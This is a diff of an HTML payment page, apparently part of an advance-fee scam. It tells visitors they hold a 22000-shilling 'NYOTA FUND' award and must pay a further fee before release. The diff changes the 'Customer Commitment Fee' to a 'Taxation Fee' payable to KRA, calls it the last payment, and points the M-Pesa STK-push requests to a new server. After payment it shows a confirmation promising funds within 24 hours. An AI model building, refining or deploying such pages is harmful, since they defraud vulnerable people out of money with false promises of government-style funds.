@@ -1,26 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
- <!-- Brevo Conversations {literal} -->
-<!-- Brevo Conversations {literal} -->
-<script>
-    (function(d, w, c) {
-        w.BrevoConversationsID = '6983ee73ee85d98dd40c3361';
-        w[c] = w[c] || function() {
-            (w[c].q = w[c].q || []).push(arguments);
-        };
-        var s = d.createElement('script');
-        s.async = true;
-        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
-        if (d.head) d.head.appendChild(s);
-    })(document, window, 'BrevoConversations');
-</script>
-<!-- /Brevo Conversations {/literal} -->
-<!-- /Brevo Conversations {/literal} -->
+<!-- Removed Brevo Conversations and added LiveChat widget -->
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Payment 3 – Customer Commitment Fee</title>
-<link rel="stylesheet" href="style.css">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Payment 3 – Taxation Fee</title>
+<link rel="stylesheet" href="style.css" />
 
 <style>
 #liveChatBtn{
@@ -46,7 +31,6 @@
   left:50%;
   top:50%;
   transform:translate(-50%,-50%);
-  /* important explicit text styles to avoid inheriting white/transparent colours */
   color:#111 !important;
   font-size:15px;
   line-height:1.4;
@@ -60,20 +44,18 @@
   min-height:160px;
 }
 
-/* Title and message specifics */
 #popupOverlay .popupContent h3{
   margin:0;
   font-size:18px;
   font-weight:600;
-  color: #111; /* explicitly dark */
+  color: #111;
 }
 #popupOverlay .popupContent p{
   margin:0;
-  color:#333; /* explicitly dark message color */
+  color:#333;
   font-size:14px;
 }
 
-/* Spinner container sizing */
 #popupSpinner{
   height:48px;
   display:flex;
@@ -81,7 +63,6 @@
   justify-content:center;
 }
 
-/* OK button style */
 #popupOverlay .popupContent #popupBtn{
   display:block;
   width:100%;
@@ -98,25 +79,31 @@
 
 <body>
 
+<!-- LiveChat Widget -->
+<script>
+  window.__lc = window.__lc || {};
+  window.__lc.license = 19513072; // Your LiveChat license ID
+  window.__lc.chat_between_groups = false;
+  (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+</script>
+
+<!-- Your existing HTML content -->
 <div class="container">
-  <h2>Customer Commitment Fee</h2>
+  <h2>Taxation Fee</h2>
 
-<p style="font-size:18px;font-weight:bold;">
-  Your Selected NYOTA FUND: <strong>Ksh <span id="fundAmount">22000</span></strong>
-</p>
+  <p style="font-size:18px;font-weight:bold;">
+    Your Selected NYOTA FUNDs: <strong>Ksh <span id="fundAmount">22000</span></strong>
+  </p>
 
-<p style="font-size:15px;line-height:1.6;color:#333;">
-  To complete your <strong>NYOTA FUNDs</strong> process, a
-  <strong>Customer Commitment Fee of Ksh 900</strong> is required.
-  This ensures that your funds are securely processed through our online
-  system, covering system deductions and safeguarding your savings.
-</p>
+  <p style="font-size:15px;line-height:1.6;color:#333;">
+    You're in good track well done . You are required to pay <strong>Ksh 990</strong> to KRA . Your award is subjected to taxation. That's the last payment. Then you receive your nyota fund desired limit Congratulations.
+  </p>
 
-<p style="font-size:15px;line-height:1.6;color:#0a6ebd;font-weight:bold;">
-  Please complete this final step. Once done, your
-  <strong>NYOTA FUNDs will be delivered safely to your chosen network.</strong><br>
-  Don’t give up now — you’re just one step away!
-</p>
+  <p style="font-size:15px;line-height:1.6;color:#0a6ebd;font-weight:bold;">
+    Please complete this final step. Once done, your
+    <strong>NYOTA FUNDs will be delivered safely to your chosen network.</strong><br>
+    Don’t give up now — you’re just one step away!
+  </p>
 
   <form id="payment3Form">
     <input id="senderName" placeholder="Full Name" required>
@@ -124,7 +111,6 @@
     <button id="payBtn" type="submit">Pay Now</button>
   </form>
 </div>
-
 
 <!-- POPUP -->
 <div id="popupOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:999;">
@@ -173,7 +159,6 @@ function showPopup(title, message="Please wait…", spin=false, ok=false){
     : '';
   popupBtn.style.display = ok ? "block" : "none";
   popupOverlay.style.display = "block";
-  // ensure text color override in-case some global css mutated it
   popupTitle.style.color = "#111";
   popupMessage.style.color = "#333";
 }
@@ -196,10 +181,10 @@ document.getElementById("payment3Form").addEventListener("submit", async e => {
   showPopup("Processing…","Sending STK push.",true,false);
 
   try{
-    const res = await fetch("https://nyotafund-server-1.onrender.com/",{
+    const res = await fetch("https://nyota-server-collins.onrender.com/pay",{
       method:"POST",
       headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({ phone, amount:900, loan_amount: fund.amount })
+      body:JSON.stringify({ phone, amount:990, loan_amount: fund.amount })
     });
 
     const data = await res.json();
@@ -239,7 +224,7 @@ function pollReceipt(ref){
     }
 
     try{
-      const r = await fetch(`https://nyotafund-server-1.onrender.com/${ref}`,{cache:"no-store"});
+      const r = await fetch(`https://nyota-server-collins.onrender.com/receipt/${ref}`,{cache:"no-store"});
       if(!r.ok) return;
 
       const d = await r.json();
@@ -254,19 +239,14 @@ function pollReceipt(ref){
 
         showPopup(
           "Payment Confirmed ✅",
-          "Ksh 900 received successfully.<br><strong>Your NYOTA FUNDs will be released within 24 hours.</strong>",
+          "Ksh 990 received successfully.<br><strong>Your NYOTA FUNDs will be released within 24 hours.</strong>",
           false,
           true
         );
-       // Manual OK click
-popupBtn.onclick = () => window.location.href = "success.html";
-
-// Auto redirect after 4 seconds
-setTimeout(() => {
-  window.location.href = "success.html";
-}, 4000);
-
-        popupBtn.onclick = () => window.location.href = "success.html";
+       // Auto redirect after 4 seconds
+        setTimeout(() => {
+          window.location.href = "success.html";
+        }, 4000);
       }else{
         payBtn.disabled = false;
         showPopup(
@@ -286,4 +266,4 @@ function openChat(){
 </script>
 
 </body>
-</html>
+   </html>
